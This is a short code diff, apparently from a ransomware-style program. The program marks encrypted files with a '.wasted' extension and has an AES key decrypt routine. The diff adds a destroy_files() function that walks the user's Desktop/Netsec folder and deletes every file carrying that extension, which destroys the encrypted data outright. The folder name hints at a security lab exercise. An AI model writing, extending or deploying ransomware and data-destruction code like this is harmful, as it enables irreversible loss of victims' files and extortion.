@@ -10,6 +10,22 @@ import modify
 
 extension = ".wasted"  # Custom encrypted extension
 
+def destroy_files():
+        if platform.system() in ["Linux", "Darwin"]:
+            startdirs = [os.environ.get('HOME', '') + '/Desktop/Netsec']
+        else:
+            startdirs = [os.environ.get('USERPROFILE', '') + '\\Desktop\\Netsec']
+
+        extension = ".wasted"
+        for currentDir in startdirs:
+            for file in discover.discoverFiles(currentDir):
+                if file.endswith(extension):
+                    try:
+                        os.remove(file)
+                        print(f"[Deleted] {file}")
+                    except Exception as e:
+                        print(f"[Error] Could not delete {file}: {e}")
+
 def decrypt(base64_aes_key):
     key = base64.b64decode(base64_aes_key)
 
